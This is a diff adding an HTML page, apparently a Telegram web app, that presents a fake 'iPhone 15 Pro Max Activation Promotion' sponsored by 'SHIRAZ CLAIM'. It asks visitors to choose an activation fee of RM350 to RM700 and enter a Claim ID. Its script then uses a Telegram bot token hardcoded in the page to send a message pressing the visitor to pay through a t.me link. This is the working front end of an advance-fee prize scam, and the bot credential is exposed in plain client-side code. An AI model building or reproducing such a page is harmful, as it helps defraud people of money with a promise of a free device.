@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iPhone 15 Pro Max Activation Promotion</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    header {
+      background-color: #222;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+      background: white;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .responsive {
+      width: 100%;
+      height: auto;
+    }
+
+    .price-options {
+      margin-top: 20px;
+    }
+
+    .price-options h3 {
+      margin-bottom: 10px;
+    }
+
+    .option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px;
+      background-color: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+
+    .option input[type="radio"] {
+      margin-right: 10px;
+    }
+
+    .btn {
+      display: inline-block;
+      background: #007bff;
+      color: white;
+      padding: 10px 15px;
+      text-align: center;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+      margin-top: 20px;
+      width: 100%;
+    }
+
+    .btn:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>iPhone 15 Pro Max Activation Promotion</h1>
+    <p>Sponsored by SHIRAZ CLAIM</p>
+  </header>
+
+  <div class="container">
+    <div class="product-image">
+      <!-- Updated image tag with new URL -->
+      <img src="https://i.imghippo.com/files/qbyr1952TU.png" alt="" border="0" class="responsive">
+    </div>
+
+    <div class="product-description">
+      <h2>Product Highlights</h2>
+      <p><strong>Device:</strong> iPhone 15 Pro Max</p>
+      <p><strong>Key Features:</strong> Titanium design, A17 Pro chip, 120Hz ProMotion display.</p>
+    </div>
+
+    <div class="price-options">
+      <h3>Activation Fee Options</h3>
+      <div class="option">
+        <label>
+          <input type="radio" name="storage" value="256GB|RM350">
+          256GB (Activation Fee: RM350)
+        </label>
+      </div>
+      <div class="option">
+        <label>
+          <input type="radio" name="storage" value="512GB|RM420">
+          512GB (Activation Fee: RM420)
+        </label>
+      </div>
+      <div class="option">
+        <label>
+          <input type="radio" name="storage" value="1TB|RM700">
+          1TB (Activation Fee: RM700)
+        </label>
+      </div>
+    </div>
+
+    <button class="btn" onclick="confirmSelection()">Proceed</button>
+  </div>
+
+  <script>
+    async function confirmSelection() {
+      // Get the selected storage option
+      const selected = document.querySelector('input[name="storage"]:checked');
+      if (!selected) {
+        alert('❗ Please select a storage option.');
+        return;
+      }
+
+      // Extract details from the selected option
+      const selectedValue = selected.value; // e.g., "256GB|RM350"
+      const [storage, fee] = selectedValue.split('|'); // Split into storage and fee
+
+      // Ask the user for their Claim ID
+      const claimID = prompt('Enter your Claim ID:');
+      if (!claimID) {
+        alert('❗ Claim ID is required! Please provide your Claim ID to proceed.');
+        return;
+      }
+
+      // Confirm the user's input
+      const isConfirmed = confirm(
+        `You selected:\nStorage: ${storage}\nActivation Fee: ${fee}\nClaim ID: ${claimID}\n\nDo you want to proceed?`
+      );
+
+      if (!isConfirmed) {
+        alert('❌ Selection canceled. Please try again.');
+        return;
+      }
+
+      try {
+        // Retrieve the user's Chat ID and first name
+        const botToken = '7930105863:AAG09Z-rBmb8KLgRlV1JZAkWZp8BxEeCTmY'; // Your bot token
+        const getUpdatesURL = `https://api.telegram.org/bot${botToken}/getUpdates`;
+
+        const updatesResponse = await fetch(getUpdatesURL);
+        const updatesData = await updatesResponse.json();
+
+        if (!updatesData.ok) {
+          throw new Error('Unable to retrieve user Chat ID.');
+        }
+
+        // Extract chat details
+        const lastMessage = updatesData.result.slice(-1)[0];
+        const chatID = lastMessage.message.chat.id; // Dynamic Chat ID
+        const firstName = lastMessage.message.chat.first_name || 'User';
+
+        // Prepare the Telegram message
+        const message = `🎉 *Dear ${firstName}, Your preferred storage has been selected and your iPhone 15 Pro Max Activation is in progress* 🎉\n\n` +
+                        `📱 *Storage:* ${storage}\n` +
+                        `💵 *Activation Fee:* ${fee}\n` +
+                        `🆔 *Claim ID:* \`${claimID}\`\n\n` +
+                        `_A payment of ${fee} is required to finalize your claimed device for postage. Proceed to make payment via SHIRAZ STORE MERCHANT !_`;
+
+        // Send the message to the user's Telegram Chat ID
+        const sendMessageURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        await fetch(sendMessageURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [[
+                { text: "Proceed to Payment", url: "https://t.me/O1119873046" }
+              ]]
+            },
+          }),
+        });
+
+        // Close the web app and return to chatbot
+        alert('✅ Your selection has been sent to the bot. You can proceed to payment from the chat.');
+        window.close();
+      } catch (error) {
+        console.error('Error during Telegram interaction:', error);
+        alert('❗ An error occurred. Please try again later.');
+      }
+    }
+  </script>
+</body>
+</html>
